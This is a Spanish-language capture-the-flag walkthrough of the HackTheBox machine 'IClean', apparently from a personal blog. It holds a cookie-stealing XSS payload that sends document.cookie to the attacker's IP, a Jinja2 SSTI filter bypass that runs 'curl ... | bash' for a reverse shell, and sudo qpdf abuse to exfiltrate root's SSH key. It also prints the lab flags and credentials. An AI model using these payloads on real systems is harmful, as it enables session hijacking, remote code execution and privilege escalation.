---
layout: default
---
![image](../../Imágenes%20Máquinas/ICLEAN.png)


# ICLEAN [HACKTHEBOX]
### (Burpsuite, fuzzing, XSS, SSTI, HTML injection, cookie hijacking, python TTY spawn, SSTI filter bypassing, mySQL, hash cracking, escalada mediante qpdf)

#### - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ´


Vamos a empezar haciendo un escaneo de nmap con los siguientes parámetros:

```bash
nmap -p- --open -sS -sCV -T5 -vvv -n -Pn [ip_target] -oN escaneo_nmap 
```

Nos muestra 2 puertos, el 80 y el 22:

![image](../zimages/Pasted%20image%2020241103180017.png)

Si hacemos un `whatweb 10.10.11.12`, nos sale un dominio, que vamos a meter en /etc/hosts:

![image](../zimages/Pasted%20image%2020241103180333.png)

Una vez dentro del /etc/hosts, ya podemos entrar en la web:

![image](../zimages/Pasted%20image%2020241103180426.png)

si nos fijamos en wappalizer, la extensión de navegador para ver lo que hay por detrás de la web, vemos que usa flask y python, por lo que podemos probar con una SQLI usando Burpsuite. Si nos fijamos, hay un panel de login, vamos a interceptarlo en Burpsuite a ver si existe una SQLI:

![image](../zimages/Pasted%20image%2020241103181055.png)

Pero vemos que no funciona con la típica:

![image](../zimages/Pasted%20image%2020241103181221.png)

No obstante, si exploramos un poco la web mediante la herramienta "target" de Burpsuite, vemos que hay otro directorio llamado '/quote':

![image](../zimages/Pasted%20image%2020241103182144.png)

si nos metemos vemos que nos manda poner un email, vamos a interceptar esto con Burpsuite:

![image](../zimages/Pasted%20image%2020241103181406.png)

Enviamos la petición al repeater para hacer unas pruebas y vemos la respuesta de la web:

![image](../zimages/Pasted%20image%2020241103182830.png)

Vamos a probar en el repeater a cambiar un par de cosas, como por ejemplo el campo "service=". Vamos a poner cualquier cosa, por ejemplo "Esto es una prueba":

![image](../zimages/Pasted%20image%2020241103182936.png)

La respuesta es la misma. Si leemos el mensaje, podemos intuir que la respuesta se manda a un equipo de gestión, pero no sabemos si la petición se envía a otro apartado de la web cuando estás logueado, o si tiene un gestor de correos, etc. 
Si por ejemplo se enviase a otro apartado de la web, podríamos ver si es vulnerable a XSS probando, por ejemplo, con una HTML injection. Una muy común es la siguiente:

```html
<img src="http://[tu_ip]/prueba" />
```

Vamos a montarnos un server con python por el puerto 80 para ver si nos hace una solicitud:

```bash
python3 -m http.server 80
```

Ahora vamos a inyectar el payload en Burpsuite de la siguiente manera:

![image](../zimages/Pasted%20image%2020241103183815.png)

Es importante ponerlo con URL Encode ya que si no falla. Si ahora enviamos esta solicitud y nos vamos a la consola donde montamos el servidor, vemos que hay una solicitud por GET:

![image](../zimages/Pasted%20image%2020241103183949.png)

Vamos a probar con algo más agresivo para intentar ver si podemos secuestrar una cookie de sesión. Con las etiquetas "<img/>", existe un parámetro llamado "onerror=", que sirve para hacer algo alternativo si la url que ponemos en src no es accesible, vamos a hacer el siguiente comando a ver si se realiza correctamente:

```html
<img src="http://10.10.14.13/prueba" onerror=fetch("http://10.10.14.13/prueba12345") />

# Que URL encodeado para ponerlo en Burpsuite se vería así: 

<!--
<img+src%3d"http%3a//10.10.14.13/prueba"+onerror%3dfetch("http%3a//10.10.14.13/prueba12345")+/>
-->
```

Y vemos que nos envía las 2 solicitudes a nuestro server de python:

![image](../zimages/Pasted%20image%2020241103185122.png)

Así que ahora vamos a probar a añadir en la solicitud que se nos envíe la cookie de sesión, de la siguiente manera:

```html
<!-- URL ENCODED para Burpsuite:
<img+src%3d"http%3a//10.10.14.13/prueba"+onerror%3dfetch("http%3a//10.10.14.13"%2bdocument.cookie)+/> -->

# Etiqueta normal:

<img src="http://10.10.14.13/prueba" onerror=fetch("http://10.10.14.13"+document.cookie) />
```

Y esto nos envía al server de python:

![image](../zimages/Pasted%20image%2020241103185817.png)

Ahora que ya tenemos la cookie de sesión (`eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zyes7w.tC2Zo-QsV-kt3NW-50WOu4KRAC0`), vamos introducirla en la web:

Ahora vamos a hacer un fuzzing de directorios para ver si hay alguno más que no hayamos visto y vemos que nos descubre el directorio "/dashboard":

![image](../zimages/Pasted%20image%2020241103190318.png)

Si nos metemos vemos las siguientes opciones:

![image](../zimages/Pasted%20image%2020241103190512.png)

Vamos a ver cada una de ellas, empezamos por la de "Generate Invoice", que nos lleva al directorio '/InvoiceGenerator', si ponemos palabras como "test" en todos los apartados, nos da un "Invoice id":

![image](../zimages/Pasted%20image%2020241103190647.png)

Si pasamos la solicitud por Burpsuite no vemos nada interesante así que vamos a pasar al siguiente apartado de '/dashboard', que nos envía al directorio '/QRGenerator':

![image](../zimages/Pasted%20image%2020241103190754.png)

Si metemos el id que nos dió antes la web, nos genera un código qr mediante una url:

![image](../zimages/Pasted%20image%2020241103190845.png)

Y si metemos esa url en el apartado que nos aparece nos lleva a una especie de factura:

![image](../zimages/Pasted%20image%2020241103190942.png)

Vamos a interceptar esta petición con Burpsuite. Nos vamos hacia atrás y le damos de nuevo a "submit" para que lo coja el Burpsuite:

![image](../zimages/Pasted%20image%2020241103191107.png)

Si cambiamos el "qr_link" por algo random:

![image](../zimages/Pasted%20image%2020241103191156.png)

Vemos que lo que escribimos se refleja directamente en el output del servidor, esto podría ser una entrada para un SSTI, vamos a probarlo:

![image](../zimages/Pasted%20image%2020241103191309.png)

He puesto en el apartado "qr_link" la inyección básica de `{{7*7}}` y nos devuelve un '49', quiere decir que es vulnerable a SQLI, vamos a irnos a 'payloadallthethings' para ver que opciones hay de ejecución de comandos. Hay muchas opciones, pero como sabemos que la web usa python, las inyecciones que tenemos que probar son las de 'Jinja2':

![image](../zimages/Pasted%20image%2020241103191558.png)

Vamos a probar con las básicas que usan "os.popen()":

![image](../zimages/Pasted%20image%2020241103191659.png)

Si probamos todas esas no funcionan en la web, no tenemos ejecución de comandos, esto es porque la web tiene un filtro que bloquea las solicitudes que tengas 2 `_` seguidas, si miramos un poco por la página de payloads, vemos que hay uno que supuestamente hace bypass a la mayoría de filtros, vamos a probarlo:

![image](../zimages/Pasted%20image%2020241103191841.png)

Lo inyectamos en la solicitud de Burpsuite y nos devuelve el comando "id":

![image](../zimages/Pasted%20image%2020241103191930.png)

Sabiendo que ya tenemos RCE, vamos a intentar conseguir una reverse shell. Para ello nos creamos un archivo .html con un código en bash, así nos aseguramos de que no se lía el servidor, ya que si ponemos el comando directamente en Burpsuite puede dar error:

![image](../zimages/Pasted%20image%2020241103192055.png)

Y ahora vamos a decirle a la web que nos ejecute el comando de la siguiente manera, no sin antes montarnos un server en python desde donde está el archivo .html y ponernos en escucha con `nc -nlvp 443`:

![image](../zimages/Pasted%20image%2020241103193001.png)

Que la solicitud en texto plano sería así:

```html
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('curl http://10.10.14.13/ | bash')|attr('read')()}}
```

Si ahora nos fijamos en la terminal que teníamos en escucha con NetCat, recibimos una reverse shell como "www-data":

![image](../zimages/Pasted%20image%2020241103193234.png)

Vemos que si hacemos el tratamiento de la TTY con "script /dev/null -c bash" se peta la shell, así que vamos a hacerlo con el siguiente comando de python:

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Ahora ya seguimos los pasos de siempre y lo tenemos:

![image](../zimages/Pasted%20image%2020241103193455.png)

Si hacemos ls en el directorio actual, tenemos un script de python "app.py", vamos a hacerle un cat y concatenamos mediante un pipe el comando "less":

![image](../zimages/Pasted%20image%2020241103193636.png)

Ahora que tenemos unas credenciales de una base de datos mysql, vamos a intentar entrar:

```bash
mysql -uiclean -ppxCsmnGLckUb capiclean
```

Vamos a pedirle que nos muestre las tablas de esta base de datos:

![image](../zimages/Pasted%20image%2020241103193858.png)

Vamos a entrar en users y listar todo lo que haya dentro:

![image](../zimages/Pasted%20image%2020241103193945.png)

Tenemos 2 hashes, vamos a intentar decodearlos en https://crackstation.net/:

![image](../zimages/Pasted%20image%2020241103194100.png)

Vemos que nos saca sólo la contraseña del usuario "consuela", vamos a intentar migrar desde la terminal con `su consuela`:

![image](../zimages/Pasted%20image%2020241103194206.png)

Ahora, en primer lugar, nos vamos al directorio /home/consuela y miramos la flag de user, que es `103bcea9bc79cd08b54ebf8a69be12a7`:

![image](../zimages/Pasted%20image%2020241103194257.png)

Ahora vamos a intentar ampliar los privilegios a root, empezamos por un `sudo -l`:

![image](../zimages/Pasted%20image%2020241103194346.png)

Tenemos acceso a un comando llamado 'qpdf', si leemos un poco las instrucciones de uso, vemos que se trata de una herramienta de edición de documentos pdf. También tiene una opción que es "--add-attachment", que te puede insertar un archivo del sistema en el pdf:

![image](../zimages/Pasted%20image%2020241103194814.png)

También tenemos una opción de "--empty", que nos permite generar un pdf sin un archivo como input:

![image](../zimages/Pasted%20image%2020241103194900.png)

Así que con estas 2 opciones, vamos a intentar que nos muestre el id_rsa de root, por ejemplo:

```bash
sudo qpdf --empty --add-attachment= /root/.ssh/id_rsa -- pwned.pdf
```

Si listamos con `ls`:

![image](../zimages/Pasted%20image%2020241103195149.png)

Ahora vamos a abrir esto, la forma más fácil es abriendo un server con python del directorio actual en la máquina víctima, vamos a usar el puerto 8080 por ejemplo. Después, con wget, nos copiamos el archivo en nuestra máquina:

![image](../zimages/Pasted%20image%2020241103195502.png)

ahora vamos a abrirlo con el siguiente comando para poder seguir operando mientras:

```bash
open pwned.pdf &> /dev/null & disown
```

Este comando nos lo abrirá como un proceso y así podríamos seguir operando desde la terminal. Ahora vamos a ir al documento que se nos ha abierto y vamos a attachments, donde vemos el id_rsa de root:

![image](../zimages/Pasted%20image%2020241103195801.png)

Nos lo vamos a copiar y vamos a crear un documento id_rsa en la máquina víctima y le damos permisos adecuados con `chmod 700 id_rsa`:

![image](../zimages/Pasted%20image%2020241103195942.png)

Nos vamos a intentar conectar a root mediante ssh con ese id_rsa:

```bash
ssh -i id_rsa root@10.10.11.12
```

Si hacemos un `whoami`, ya somos root:

![image](../zimages/Pasted%20image%2020241103200048.png)

Nos vamos al directorio '/root' y tenemos la flag de root (`abc73e6dc5e00806606a41efb6482fbd`):

![image](../zimages/Pasted%20image%2020241103200136.png)

![image](../zimages/Pasted%20image%2020241103171820.png)

# ./ROOTED
